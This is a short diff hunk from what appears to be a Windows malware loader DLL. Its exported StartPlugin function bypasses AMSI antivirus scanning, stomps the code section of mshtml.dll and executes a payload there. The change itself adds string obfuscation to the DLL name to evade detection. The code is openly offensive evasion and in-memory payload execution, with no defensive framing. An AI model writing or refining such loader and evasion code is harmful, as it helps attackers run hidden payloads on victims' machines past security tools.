@@ -70,7 +70,7 @@ extern "C" __declspec(dllexport) void StartPlugin() {
     BypassAMSI_DataOnlyRobust();
 
     STOMP_CONTEXT ctx = {0};
-    if (ModuleStompRobust(L"mshtml.dll", 0x1000, &ctx)) {
+    if (ModuleStompRobust(STOBFS_W(L"mshtml.dll"), 0x1000, &ctx)) {
         PVOID pTarget = (PBYTE)ctx.BaseAddress + ctx.TextSection->VirtualAddress;
         ExecutePayload(pTarget, ctx.RegionSize);
     }
